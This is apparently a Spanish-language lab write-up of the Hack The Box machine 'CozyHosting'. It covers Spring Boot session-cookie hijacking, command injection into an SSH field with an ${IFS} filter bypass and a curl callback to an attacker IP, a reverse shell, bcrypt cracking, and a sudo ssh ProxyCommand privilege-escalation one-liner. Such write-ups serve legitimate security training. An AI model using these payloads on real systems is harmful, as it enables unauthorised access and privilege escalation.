
---
- Tags: #linux #Easy #HTB #sudo #Hashcracking #cookies #PostgreSQL
- -- 

#### QUÉ SE EXPLOTA?

Spring Boote Web Page Enumeration
Information Leakage
Cookie Hijacking
Command Injection + Filter Bypass
JAR archive inspection with JD-GUI + Information Leakage
PostgreSQL Database Enumeration
Cracking Hashes
Abusing Sudoers Privilege (ssh) [Privilege Escalation]
#### Write UP

##### PRIMERA FASE: Reconocimiento

**Cómo ya es costumbre vamos a empezar** con un escaneo **icmp** para determinar el sistema operativo de la maquina qué vamos a estar auditando. 
**Después seguimos con 2 fases de escaneo**.

**El primer escaneo lo usaremos para determinar todos los puertos que estén disponibles en la maquina**, con los resultados obtenidos... pasaremos a hacer nuestro segundo escaneo. 

**En este escaneo queremos obtener información más detallada sobre los puertos previamente encontrados** 

![](../imgs/Pasted image 20251108082656.png)
Encontramos los puertos 22 y 80 abiertos. **Además, la maquina está intentando resolver el dominito *cozyhosting.htb* por lo que lo tenemos que agregar al [[etc-hosts]]**. 
![](../imgs/Pasted image 20251108082823.png)

**Revisamos con *whatweb* detalles sobre la arquitectura de la página web** pero, no encontramos nada de valor así proseguimos a investigar la página web. 

![](../imgs/Pasted image 20251108091003.png)
No encontramos mucho, pero, había un login. 
**Además de eso, vimos que arrojaba un error cuando buscabamos alguna página que no existiera**. 

![](../imgs/Pasted image 20251108091152.png)
**A través de los errores también podemos encontrar información**. Buscando sobre el origen de ese error nos dimos cuenta que estaba haciendo referencia a **[[Springboot]]**.

**Antes de empezar a hacer explotación** proseguimos a descubrir directorios ocultos de [[Springboot]]. Para eso utilizamos **[[GoBuster]]** con el directorio de [[Springboot]]. 

![](../imgs/Pasted image 20251108092256.png)


En **sessions** encontramos lo que parecía ser una **cookie**.

![](../imgs/Pasted image 20251108092355.png)

##### SEGUNDA FASE: Explotación 

**Una vez ya que teniamos una posible cookie** proseguimos a reemplazar la nuestra por la que encontramos en el panel de **login**. 

![](../imgs/Pasted image 20251108092803.png)

![](../imgs/Pasted image 20251108092846.png)

Al haber reemplazado la **cookie** nos dió accesso inmediato. **Proseguimos a analizar** la pagina y encontramos que había un apartado para entablar **conexionas remotas** 

![](../imgs/Pasted image 20251108093031.png)

**Además al parecer usa [[SSH]]** .

Mandamos una inyeción en **bash** para ver si era vulnerable. 

```bash
ssh user@ip
.```

		siguiendo la logica de ese comando intentamos:

```bash

ssh user;whoami;#
```


![](../imgs/Pasted image 20251108093306.png)
nos está devolviendo el **whoami**

**No nos muestra resultados, pero, no nos está marcando error**
![](../imgs/Pasted image 20251108093616.png)
**Intentamos enviarnos un ping** con el proposito de ver si nos está mandando conexión. 

![](../imgs/Pasted image 20251108093921.png)

![](../imgs/Pasted image 20251108094026.png)

podemos jugar con **${IFS}** para hacer espacios sin dejarlos.

```bash

curl${IFS}10.10.10.10
```

recibimos conexión:

![](../imgs/Pasted image 20251108094625.png)

**Proseguimos a mandarnos una [[Reverse shell]]** para esto lo hacemos a través de un **index.html**
![](../imgs/Pasted image 20251108094755.png)
![](../imgs/Pasted image 20251108094810.png)
![](../imgs/Pasted image 20251108095233.png)
Indicamos que el index lo interprete con **bash**, nos ponemos en escucha y **listo**

![](../imgs/Pasted image 20251108095208.png)

##### TERCERA FASE: Post Explotación - Privesc

	**Explorando en el directorio** encontramos un archivo [[jar]] que al parecer tenía toda la aplicación, por lo que procedimos a hacer una [[Transferencia con bash]].

![](../imgs/Pasted image 20251108132229.png)

![](../imgs/Pasted image 20251108132246.png)

**Una vez recibido, checamos que la transferencia se hizo de manera correcta con hash md5.** 

```bash

md5sum archivo.txt
```

La transferencia tuvo éxito. 

**Descomprimios el [[jar]] con 7z** 

**Antes de abrir el archivo con [[jd-gui]] verificamos con** *tree* si había algún archivo con la palabra **password**

![](../imgs/Pasted image 20251108132640.png)

![](../imgs/Pasted image 20251108132735.png)

encontramos algo interesante. **Ahora sí con jd-gui** abrimos el archivo para verlo mejor y nos dijirimos a la ruta donde se encontró la password. 

![](../imgs/Pasted image 20251108132910.png)

**Encontramos la contraseña de una base de datos [[PostgreSQL]]** por lo que procedimos a enumerar a ver is encontrabamos algo de utilidad. 

![](../imgs/Pasted image 20251108133441.png)

Encontramos 2 ususarios **al parecer están hasheadas sus conrtaseñas con bcrypt**. Por lo que proseguimos a usar [[hashid]] para ver que tipo de contraseñas eran y además usamos [[hashcat]] para deshashearlas. 

![](../imgs/Pasted image 20251108133636.png)


![](../imgs/Pasted image 20251108140931.png)


Vimos que era del usuario admin. **Proseguimos a checar el directorio /home** y vimos un usuario llamado **josh** checamos si era su contraseña y... 

![](../imgs/Pasted image 20251108141056.png)

**Josh puede utilizar [[SSH]]** con permisos [[SUDO]] 

![](../imgs/Pasted image 20251108141135.png)

**Buscamos en [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo)** 

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x 
```


![](../imgs/Pasted image 20251108141726.png)


**Y listo** 
